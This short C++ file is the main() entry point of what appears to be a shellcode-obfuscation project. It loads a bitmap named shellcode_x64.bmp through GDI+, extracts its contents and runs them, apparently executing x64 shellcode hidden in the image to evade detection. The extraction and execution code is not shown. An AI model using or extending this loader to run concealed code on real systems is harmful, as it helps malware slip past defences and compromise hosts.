#include "reader.h"


int main() {
    // Init Gdiplus
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);


    Gdiplus::Bitmap* bmp = load_image(L"C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\samples\\shellcode\\shellcode_x64.bmp");
    read_image(bmp);
    run();

    GdiplusShutdown(gdiplusToken);

    return 0;
}